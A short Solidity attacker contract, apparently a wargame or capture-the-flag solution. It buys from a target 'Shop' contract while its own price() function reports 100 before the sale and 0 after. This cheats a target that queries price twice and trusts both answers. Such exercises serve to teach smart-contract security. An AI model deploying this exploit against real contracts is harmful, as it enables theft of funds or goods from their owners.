// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopAttacker {
    IShop instance;

    function attack(address instanceAddr) external {
        instance = IShop(instanceAddr);
        instance.buy();
    }

    function price() external view returns (uint256) {
        if (!instance.isSold()) {
            return 100;
        } else {
            return 0;
        }
    }
}
